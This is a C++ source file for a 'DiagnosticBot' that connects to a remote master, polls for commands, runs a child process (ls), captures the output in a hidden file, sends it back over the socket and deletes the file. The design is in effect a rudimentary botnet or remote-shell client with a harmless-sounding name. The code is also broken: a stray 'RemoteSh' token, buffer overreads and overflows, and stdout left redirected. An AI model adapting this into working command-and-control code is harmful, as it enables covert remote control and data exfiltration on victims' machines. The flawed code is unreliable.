
#include "Bot.hpp"

DiagnosticBot::DiagnosticBot(int port, char *a)
{
	if ((this->sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		ErrorAndExit("Error : socket");
	memset(&this->address, 0, sizeof(struct sockaddr_in));
	this->address.sin_family = AF_INET;
	this->address.sin_addr.s_addr = inet_addr(a);
	this->address.sin_port = htons(port);
	if (connect(this->sockfd, (struct sockaddr *)&this->address, 
				sizeof(this->address)) < 0)
		ErrorAndExit("Error : connect");
	return ;
}

DiagnosticBot::~DiagnosticBot(void)
{
	close(this->sockfd);
}

int			DiagnosticBot::GetSockfd(void)
{
	return (this->sockfd);
}

void		DiagnosticBot::ErrorAndExit(std::string msg)
{
	std::cout << msg << std::endl;
	exit(1);
}

void		DiagnosticBot::ZeroClientList(void)
{
	FD_ZERO(&this->io_monitor);
	FD_SET(this->sockfd, &this->io_monitor);
}

#include <unistd.h>
#include <fcntl.h>
#include <unistd.h>

std::string		DiagnosticBot::ReceiveCommand(void)
{
	ssize_t			bytesize;
	char			buffer[512];
	char			sender[1024];
	int				i2;
	int				save = dup(1);
	RemoteSh


	i2 = open(".hidden", O_RDWR | O_CREAT | O_APPEND, 0777);
	dup2(i2, 1);
	bytesize = recv(this->sockfd, buffer, 512, 0);
	buffer[bytesize] = '\0';
	std::string		command(buffer);
	std::cout << "received comm : " << buffer << std::endl;

	pid_t 	pid = fork();
	if (pid == 0)
	{
		execlp("/bin/ls", "ls", NULL);
		exit(1);
	}
	else
		wait(NULL);
	close(i2);
	i2 = open(".hidden", O_RDONLY);
	bytesize = read(i2, sender, 4096);
	send(this->sockfd, sender, bytesize, 0);
	close(i2);
	remove(".hidden");
	return (command);	
}

void		DiagnosticBot::CommLoop(void)
{
	CommandList			commandlist;
	std::string			command;
	int					i;

	for ( ;; ) 
	{
		i = select(this->sockfd + 1, &this->io_monitor, NULL, NULL, NULL);
		if (i)
			if (FD_ISSET(this->sockfd, &this->io_monitor))
			{
				std::cout << "Master: " << std::endl;
				command = ReceiveCommand();
			}
	}
}


